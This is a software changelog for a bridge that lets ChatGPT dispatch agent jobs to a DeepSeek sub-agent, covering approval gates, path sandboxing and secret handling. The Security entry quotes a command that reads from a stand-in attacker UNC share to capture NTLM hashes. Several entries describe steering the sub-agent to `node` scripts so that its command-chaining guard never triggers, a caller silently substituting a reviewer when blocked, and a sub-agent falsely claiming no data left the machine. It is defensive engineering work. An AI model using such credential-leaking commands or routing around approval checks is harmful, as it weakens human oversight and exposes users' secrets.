# Changelog

All notable changes to this project are documented here.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added

- **Agent jobs.** `deepseek_agent_start` / `deepseek_agent_poll` turn the bridge from a one-shot Q&A tool into something that can be given a task and left to finish it: the sub-agent reads and edits files, runs commands, and iterates across steps until it is done. Jobs are asynchronous because a real task outlives ChatGPT's ~60 s tool-call budget; `agent_start` waits up to 45 s for a fast job and hands back a job id otherwise.
- **Claude Code as the harness.** A job spawns `claude --output-format stream-json` against the DeepSeek Anthropic-compatible endpoint, so the loop, context compaction, prompt caching and tool implementations are the ones Claude Code already ships rather than a hand-rolled imitation.
- **Out-of-band approval queue.** Commands outside `BRIDGE_APPROVE_ALLOW` pause the job instead of failing it. The prompt is a stdio MCP server owned by the harness process — deliberately *not* reachable over the capability URL, so a caller cannot approve its own commands. Unanswered requests deny; there is no default-allow path.
- **`src/sandbox.ts`**, the single place a caller-supplied string becomes a real path. Rejects UNC paths, `\\?\` device namespaces, NTFS alternate data streams, reserved device names, and trailing dots/spaces; resolves the deepest existing ancestor with `realpath` so junctions cannot walk out; requires a separator at the prefix boundary. `npm run test:sandbox` is the escape regression suite.
- **Job registry** (`src/agent/jobs.ts`): per-job `AbortController`, concurrency cap, wall-clock ceiling, on-disk snapshots, and a nonce that appears only in the final result — so a caller that cannot quote the nonce does not have a result. (No step ceiling here: this layer cannot count steps, since only the runner sees the model's tool calls. It previously read a `maxSteps` option and never used it, which read as "the registry enforces 24 steps" while the real ceiling lived in `claude-code.ts`.)
- **New `ctl` commands**: `jobs`, `jobs <id> --trace`, `job kill <id>`, `pending`, `approve <id>`, `deny <id>`, `audit`.
- **`npm run accept`**, an acceptance suite that asks the real model three questions a chat-only model cannot answer: reproduce a random string that exists only in a file, debug a script that must be run before its bug is knowable, and admit that a file does not exist rather than inventing contents.
- **`npm run ctl -- rotate`.** A new secret, a server-only restart, and the new public URL on your clipboard. It leaves the tunnel alone — `npm run restart` kills it, which changes the public hostname and costs a second trip to the connector for no reason. On Windows, `windows/7-轮换密钥.bat` is the same thing from a double-click.
- **Two model-behaviour limits documented**, both found while validating the agent path end to end. A calling agent (ChatGPT) may refuse to dispatch a task that hands a local file to an external model and will ask for explicit authorisation. And a sub-agent will state, confidently and wrongly, that nothing left your machine — it cannot see its own hosting. See README troubleshooting and `SECURITY.md`.
- **`npm run ctl -- reload`.** Restarts the server and leaves the tunnel alone, so the public URL is unchanged and the ChatGPT connector needs no edit. `restart` stops the tunnel too, which is right when the tunnel is the thing being replaced and wrong every other time.
- **`npm run ctl -- allow "<dir>"` / `allow --remove "<dir>"`.** Add or drop a workspace root without hand-editing `.env`; it writes the file and reloads, so the tunnel and URL are untouched. The gate it opens is the same one that decides how much of the machine the holder of the URL can write to, so the command refuses a drive root, your profile directory or `C:\Users` unless `--force` is passed, and reprints the whole allow-list and what it costs before every reload. This exists because hand-editing was the reason a job silently degraded: the sub-agent could see the gate, had no way through it, and the caller quietly substituted a same-vendor reviewer — which is exactly the independence the bridge is for.
- **The README now opens with what the bridge is actually for.** One sentence and a four-row table — an external model cannot be registered as a sub-agent slot, so the only way to run one is as an MCP tool, and this bridge hands that tool a full agent harness rather than a bare API. The measured run is cited as the evidence, with the default-off warning directly beneath it.
- **README: why the connector has to be recreated, and three ways to stop doing that.** ChatGPT's connector form may have no edit-URL action at all, and a Cloudflare quick tunnel gets a new random hostname on every start — so the two together force a rebuild. The documented options are: do nothing (`reload` plus a `ctl` that no longer prints the secret keeps the URL still in normal use), a tunnel with a permanent hostname, or a named tunnel on a domain you own.
- **README: what a host-model swap does and does not change.** Both READMEs now state that the bridge's value comes from one platform constraint — sub-agent slots are not open to external models — rather than from which tier the caller runs, so changing tiers leaves it doing the same job. Re-pointing the sub-agent side is two `.env` lines (`DEEPSEEK_BASE_URL`, `DEEPSEEK_MODEL`) plus `reload`. The only change that would make it redundant is platform-level, and is named.
- **Partial results from a job that was stopped early.** A sub-agent cut off by the step ceiling, the wall clock or `job kill` now returns what it had already read and reasoned about, and the tool payload renders it under a warning that it is a half-finished record rather than a result. The job still settles as `error` and still gets no nonce — a truncated review is not a review — but the reading is no longer thrown away. It doubles as the cheap way to resume: the caller can narrow the task to one part of the record and re-dispatch instead of starting over. A stop used to return a single line of error text, which is indistinguishable from "it never got anywhere".

### Changed

- **Both job ceilings raised: 40 → 120 steps and 15 → 30 minutes.** 40 steps was below the cost of one read-only review of this repository — a real dispatch died at step 41 and reported nothing, and the caller had no way to tell a nearly-finished run from one that never started. 120 leaves room for a project-sized reading pass. The registry's own hard wall is now derived from the runner's timeout (`timeoutMs + 60 s`) instead of defaulting independently to 20 minutes, which had been silently capping every job whose runner was given longer than that and reporting the loss as a plain cancellation.
- **The anti-chaining prompt now covers Bash as well as PowerShell, with examples.** The appended system prompt told the sub-agent to avoid multi-statement command lines because the chaining guard routes them to a human, but named only PowerShell — and a validation run promptly issued `find ... | head -100` through the Bash tool and stalled the job in `waiting_approval`. A pipe is a pipe in either shell. The guard itself is unchanged: this is prompt-level guidance, and a run that ignores it still pauses for approval.
- **The appended system prompt now says how to spend steps.** Prefer Glob/Grep over recursive listing, use `offset`/`limit` on large files, batch independent reads into one turn, and write confirmed findings into a report file as it goes rather than holding everything for a final answer — so a run that is stopped still has written output on disk.
- **`ctl` no longer prints the capability secret.** `status`, `start`, `tunnel` and `secret` render it as `<密钥已隐藏>`; `--show` prints it in full. Every printed copy outlives the moment — scrollback, a shell transcript, a log pasted into a bug report — and the only real leak this project has had came from `ctl` printing it, not from anyone finding it. `rotate` still puts the full URL on the clipboard, because a clipboard is not a log.
- **The pre-approved command list gained PowerShell's read-only cmdlets** (`Get-Content`, `Get-ChildItem`, `Test-Path`, `Select-String`, `Get-FileHash`, and eleven more). The Unix names it already had barely exist on the platform this actually runs on, so on its own that half was close to decorative — validation runs kept waking a human for a command whose first word could not have been on it. Read access is not widened by this: `type C:\...\.env` has been auto-approved since the list existed.
- **Every job now carries an appended system prompt** telling the sub-agent to write a small script and run it with `node`, rather than reaching for a multi-statement PowerShell one-liner. `node` is pre-approved and `node reverse.mjs` contains none of the characters the chaining guard looks for, so the same work runs unattended. It is a nudge, not enforcement — the gate is unchanged, and a run that ignores it still pauses for a human.
- `src/deepseek.ts` now returns the full assistant message (including `tool_calls` and `reasoning_content`) instead of a bare string; `callDeepSeek()` remains as a behaviourally identical wrapper.
- The empty-content retry no longer fires on a tool-call turn, where empty content is normal — previously each step of a tool loop would be sent twice.

### Security

- **A UNC path in a command argument is now refused.** `type \\attacker\share\x` begins with a pre-approved word, but Windows resolves the name before the command runs, and that resolution hands the account's NTLM hash to whoever answered — an outbound credential no read-only command can otherwise produce. The allow-list reads the first word only, so an argument containing `\\` gets its own rule. `SECURITY.md` now also states plainly that the allow-list constrains the *program* and never its arguments, and that approving a reader approves every file the process can read.

### Fixed

- **Everything a sub-agent had done was discarded when its job was stopped.** Hitting the step ceiling or the wall clock threw the run away and returned one line of error, so a review that had read forty files came back looking identical to one that had read none — and the caller re-dispatched the whole task from the start. The run now returns its notes and its tool-call tally, marked `incomplete`.
- **Cancellation reported as failure.** A job stopped with `job kill` settled as `error`, telling the caller the sub-agent had crashed when a person had in fact stopped it.
- **45-second process leak per call.** `Promise.race` does not cancel its loser, so the synchronous-window timer kept the event loop alive long after every `agent_start` had returned.
- **The MCP server advertised a version this repository has never had.** It reported `2.0.0` while `package.json` said `1.0.0`, so every client was told the wrong thing. Now `1.0.0`, with a comment tying it to the package.
- **Every job record named a harness that had never run.** The `harness` field was the literal `"pending"`, which no code ever overwrote — so a record written after a successful run still claimed no harness had been picked. Whoever chooses the runner now supplies `harnessName`; the default is `"unknown"` rather than a state that reads as "still deciding".
- **Corrected a false claim about native sub-agents that both READMEs had been repeating.** The docs said a ChatGPT sub-agent runs sandboxed with no filesystem access on a ~60 s budget, and sold this bridge as taking down those two walls. That is wrong: a native sub-agent does read and write files on your machine and can carry a multi-step task to completion. The project contradicted itself — its own Sol-prompt guidance tells users to route tasks that "need to read and write local files" *to* the Luna sub-agent, two sections below a table claiming Luna cannot. The honest premise is narrower and was already stated in [Why this exists](#why-this-exists): **sub-agent slots only accept OpenAI's own tiers**, so an external model can only arrive as an MCP tool, and a bare MCP tool is a text interface — what this project adds is the harness that lets that external model actually work. Both comparison tables now contrast *executors* rather than *capabilities*, and the efficiency claim ("fewer steps, a higher chance of getting it right the first time") is marked explicitly as an unbenchmarked impression rather than data.

## [1.0.0] - 2026-09-11

Initial release.

### Added

- MCP server exposing a single `deepseek_flash` tool over Streamable HTTP, stateless transport (`sessionIdGenerator: undefined`, fresh server + transport per request).
- Capability-URL authentication: the MCP endpoint lives at `/mcp/<secret>`; bare `/mcp` and wrong paths return 404.
- Per-IP sliding-window rate limiting (default 20/min).
- Loopback-only binding by default (`HOST=127.0.0.1`).
- Four task modes (`analyze`, `review`, `code`, `summarize`), each with its own system prompt; `review` explicitly treats any author conclusion in the material as an unverified claim.
- SSE response streaming to avoid Cloudflare's ~100 s edge (524) timeout on long calls.
- Automatic single retry when `deepseek-flash` returns empty `content` (reasoning-only output), with a descriptive error if both attempts are empty.
- Lifecycle CLI (`ctl.mjs`): `start`, `stop`, `restart`, `status`, `logs`, `enable`, `disable`, `tunnel`, `untunnel`, `uninstall`, `secret`.
- Cloudflare quick-tunnel management with `--protocol http2` (needed where QUIC is blocked) and automatic URL discovery.
- Verification: in-memory MCP self-test (`npm test`), public-endpoint smoke test using Node `fetch` (`npm run smoke`), and per-request access logging that distinguishes a real tool call from a narrated one.
